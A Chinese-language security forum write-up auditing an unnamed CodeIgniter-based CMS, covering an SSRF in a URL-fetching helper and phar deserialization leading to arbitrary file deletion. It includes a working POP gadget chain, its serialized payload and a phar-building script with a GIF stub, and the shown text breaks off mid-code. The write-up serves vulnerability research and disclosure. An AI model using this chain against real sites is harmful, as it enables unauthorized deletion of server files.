---
title: 记一次某CMS反序列化任意文件删除的审计过程
url: https://forum.butian.net/share/3846
source: 奇安信攻防社区
date: 2024-11-06
fetch_date: 2025-10-06T19:13:00.501643
---

# 记一次某CMS反序列化任意文件删除的审计过程

#

[问答](https://forum.butian.net/questions)

*发起*

* [提问](https://forum.butian.net/question/create)
* [文章](https://forum.butian.net/share/create)

[攻防](https://forum.butian.net/community)
[活动](https://forum.butian.net/movable)

Toggle navigation

* [首页 (current)](https://forum.butian.net)
* [问答](https://forum.butian.net/questions)
* [商城](https://forum.butian.net/shop)
* [实战攻防技术](https://forum.butian.net/community)
* [漏洞分析与复现](https://forum.butian.net/articles)
  NEW
* [活动](https://forum.butian.net/movable)
* [摸鱼办](https://forum.butian.net/questions/Play)

搜索

* [登录](https://forum.butian.net/login)
* [注册](https://user.skyeye.qianxin.com/user/register?next=http://forum.butian.net/btlogin)

### 记一次某CMS反序列化任意文件删除的审计过程

* [漏洞分析](https://forum.butian.net/topic/48)

一开始心血来潮想审计PHP系统，于是网上找了找一些开源比较知名的系统，于是找到了某CMS最新版，通过观察最近好像没出过什么大洞，于是想审计一下，跟随之前大佬挖漏洞的思路，尝试挖掘一下最新版的漏洞。其中会涉及到一些漏洞基础原理，关键部分会进行模糊处理，希望各位大佬理解，菜鸡一枚，勿喷/(ㄒoㄒ)/~~

SSRF漏洞原理
========
SSRF（Server-Side Request Forgery，服务器端请求伪造）是一种安全漏洞，攻击者通过引诱服务器发起请求到内部系统或者网络中的其他服务器。SSRF漏洞的发生是因为服务端提供了从外部系统获取数据的功能，但是没有对请求进行合适的限制，导致攻击者可以指定请求的目标，并可能获取到内部网络的数据。
概述
==
一开始心血来潮想审计PHP系统，于是网上找了找一些开源比较知名的系统，于是找到了某CMS最新版，通过观察最近好像没出过什么大洞，于是想审计一下，跟随之前大佬挖漏洞的思路，尝试挖掘一下最新版的漏洞。其中会涉及到一些漏洞基础原理，关键部分会进行模糊处理，希望各位大佬理解，菜鸡一枚，勿喷/(ㄒoㄒ)/~~ 下面开始审计分析
### `dr\_catcher\_data`
这里我们定位到`/Fcms/Core/Helper.php`
函数部分代码
```php
\* 调用远程数据 curl获取
\*
\* @param $url
\* @param $timeout 超时时间，0不超时
\* @param $is\_log 0表示请求失败不记录到系统日志中
\* @param $ct 0表示不尝试重试，1表示重试一次
\* @return 请求结果值
\*/
function dr\_catcher\_data($url, $timeout = 0, $is\_log = true, $ct = 0) {
if (!$url) {
return '';
}
// 获取本地文件
if (strpos($url, 'file://') === 0) {
return file\_get\_contents($url);
} elseif (strpos($url, '/') === 0 &amp;&amp; is\_file(WEBPATH.$url)) {
return file\_get\_contents(WEBPATH.$url);
} elseif (!dr\_is\_url($url)) {
if (CI\_DEBUG &amp;&amp; $is\_log) {
log\_message('error', '获取远程数据失败['.$url.']：地址前缀要求是http开头');
}
return '';
}
```
触发SSRF漏洞点
---------
### `test\_attach`
`/Fms/Control/Admin/Api.php` `test\\_attach`
下面是代码部分
```php
/\*\*
\* 测试远程附件
\*/
public function test\_attach() {
$data = \Phpcmf\Service::L('input')-&gt;post('data');
if (!$data) {
$this-&gt;\_json(0, dr\_lang('参数错误'));
}
$type = intval($data['type']);
$value = $data['value'][$type];
if (!$value) {
$this-&gt;\_json(0, dr\_lang('参数不存在'));
} elseif ($type == 0) {
if (substr($value['path'],-1, 1) != '/') {
$this-&gt;\_json(0, dr\_lang('存储路径目录一定要以“/”结尾'));
} elseif ((dr\_strpos($value['path'], '/') === 0 || dr\_strpos($value['path'], ':') !== false)) {
if (!is\_dir($value['path'])) {
$this-&gt;\_json(0, dr\_lang('本地路径[%s]不存在', $value['path']));
}
} elseif (is\_dir(SYS\_UPLOAD\_PATH.$value['path'])) {
} else {
$this-&gt;\_json(0, dr\_lang('本地路径[%s]不存在', SYS\_UPLOAD\_PATH.$value['path']));
}
}
$rt = \Phpcmf\Service::L('upload')-&gt;save\_file(
'content',
'this is phpcmf file-test',
'test/test.txt',
[
'id' =&gt; 0,
'url' =&gt; $data['url'],
'type' =&gt; $type,
'value' =&gt; $value,
]
);
if (!$rt['code']) {
$this-&gt;\_json(0, $rt['msg']);
} elseif (strpos(dr\_catcher\_data($rt['data']['url']), 'phpcmf') !== false) {
$this-&gt;\_json(1, dr\_lang('测试成功：%s', $rt['data']['url']));
}
$this-&gt;\_json(0, dr\_lang('无法访问到附件: %s', $rt['data']['url']));
}
```
分析得到，下面
```php
$data = \Phpcmf\Service::L('input')-&gt;post('data');
elseif (strpos(dr\_catcher\_data($rt['data']['url']), 'phpcmf') !== false)
```
`POST`请求中，`data['url']` 途中没有任何过滤 就给到了 `dr\_catcher\_data()`函数，但是`dr\_catcher\_data`函数可以处理`file`，`Http`等协议的函数封装。如封装了,`file\_get\_contents`、`curl\_exec`等。造成了`SSRF`的漏洞
反序列化
====
任意文件删除
------
phar反序列化漏洞点
-----------
我们直接找 文件函数：`is\_dir`，`file\_exist`等等
在源码路径：`/Fms/Control/Admin/Api.php`里面
其实很多个功能都存在`phar`反序列化触发点
### test\\_attach
![图片.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2024/10/attach-0d8f6563d59b6b89ed20416952228cad80f32c05.png)
### test\\_attach\\_domain
![图片.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2024/10/attach-42411507aaf4fdd85e9ed2e5785a637ecd1b5186.png)
后面主要是以：`test\_attach\_domain`来作利用
POP查找
-----
### 链一（失败）
#### 序列化代码
```php
需要第一类来new一下
namespace CodeIgniter\Publisher;
class Publisher
{
public $scratch = "../1";
//通过\_\_destruct触发 delete scratch
//通过new 对象 触发\_\_construct helper('filesystem')，因为deltete用到了filesystem方法。
}
namespace CodeIgniter\Cache\Handlers;
class MemcachedHandler
{
public $prefix;
public \_\_construct()
{
this-&gt;$prefix = new CodeIgniter\Publisher\Publisher(); //触发构造方法 和 销毁方法
}
}
var\_dump(serialize(new MemcachedHandler()))
```
#### POP链
```php
Publisher：construc.helper(['filesystem'])->destruct()-> wipeDirectory()->delete\_files()
```
`detele\_files()`函数 需要由引入 `helper(['filesystem'])`;
思路：通过 `MemcachedHandler` 任意属性 调用`new Publisher`触发 `helper('filesystem')`引入`delete\_files()`类
#### 分析
先看看几个重要的方法（简化）
##### `Publisher`
`\_construct方法()`
```php
helper(['filesystem']);
```
`\_destruct()方法`
```php
public function \_\_destruct()
{
self::wipeDirectory($this-&gt;scratch);
}
```
`wipeDirectory`方法
```php
private static function wipeDirectory(string $directory): void
{
$attempts = 10;
while ((bool) $attempts &amp;&amp; ! delete\_files($directory, true, false, true)) {
$attempts--;
}
@rmdir($directory);
}
```
#### 失败原因
显示delete\\_files()不存在
![图片.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2024/10/attach-fc1c7c2d8d786770807846398ede8f073f0ee827.png)
#### 总结
反序列化过程，不会创建对象。不管序列化中new在何处，也只是告诉解析器 new这个位置 需要替换 该类型对象的属性。
反序列化原理：创建空对象，把属性值传递进去（本质，属性替换）
### 链子二
#### 序列化代码
```php
&lt;?php
//=======实现delete方法有，unlink(this-&gt;$path.$this-&gt;prefix.$lockkey)
namespace CodeIgniter\Cache\Handlers;
class FileHandler
{
public $prefix;
public $path;
public function \_\_construct()
{
$this-&gt;prefix='';
$this-&gt;path='';
}
}
//=======MemcachedHandler中close()有$this-&gt;memcached-&gt;delete($this-&gt;lockKey)
namespace CodeIgniter\Session\Handlers;
class MemcachedHandler
{
public $lockKey; //传入delete()的值
public $memcached;
public function \_\_construct()
{
//$this-&gt;memcached-&gt;detele($this-&gt;lockKey);
$this-&gt;lockKey = "D:\\phpstudy\_pro\\WWW\\test.test"; //文件路径
$this-&gt;memcached = new \CodeIgniter\Cache\Handlers\FileHandler(); //触发下一个delete
}
}
//==========RedisHandler中destruct有this-&gt;redis-&gt;close()
namespace CodeIgniter\Cache\Handlers;
class RedisHandler
{
public $redis;
public function \_\_construct()
{
$this-&gt;redis = new \CodeIgniter\Session\Handlers\MemcachedHandler(); //指向MemcachedHandler对象
}
//因为后续有 this-&gt;redis-&gt;close()操作，可以用MemcachedHandler的close函数。
}
$o = new new RedisHandler());
$phar = new Phar("phar.phar"); //后缀名必须为phar
$phar-&gt;startBuffering();
$phar-&gt;setStub("GIF89a"."&lt;?php \_\_HALT\_COMPILER(); ?&gt;"); //设置stub
$phar-&gt;setMetadata($o); //将自定义的meta-data存入manifest
$phar-&gt;addFromString("test.txt", "test"); //添加要压缩的文件
$phar-&gt;stopBuffering(); //签名自动计算
?&gt;
```
#### 序列化字符串
```php
string(275) "O:39:"CodeIgniter\Cache\Handlers\RedisHandler":1:{s:5:"redis";O:45:"CodeIgniter\Session\Handlers\MemcachedHandler":2:{s:9:"memcached";O:38:"CodeIgniter\Cache\Handlers\FileHandler":2:{s:6:"prefix";s:0:"";s:4:"path";s:0:"";}s:7:"lockKey";s:29:"D:\phpstudy\_pro\WWW\test.test";}}"
```
#### POP链
```php
RedisHandler \_\_destruct() -&gt; MemcachedHandler close() -&gt; FileHandler delete()
```
#### 分析
##### RedisHandler
\\_\\_destruct
调用了$this-&gt;redis-&gt;close()
```php
public function \_\_destruct()
{
if (isset($this-&gt;redis)) {
$this-&gt;redis-&gt;close();
}
}
```
redis改为 MemcachedHandle对象
##### MemcachedHandler
实现close()
```php
public function close(): bool
{
if (isset($this-&gt;memcached)) {
if (isset($this-&gt;lockKey)) {
$this-&gt;memcached-&gt;delete($this-&gt;lockKey);
}
if (! $this-&gt;memcached-&gt;quit()) {
return false;
}
$this-&gt;memcached = null;
return true;
}
return false;
}
```
找`delete`，存在 `$this->memcached->delete($this->lockKey)`
##### `FileHandler`
```php
namespace CodeIgniter\Cache\Handlers;
public function delete(string $key)
{
$key = static::validateKey($key, $this-&gt;prefix);
return is\_file($this-&gt;path . $key) &amp;&amp; unlink($this-...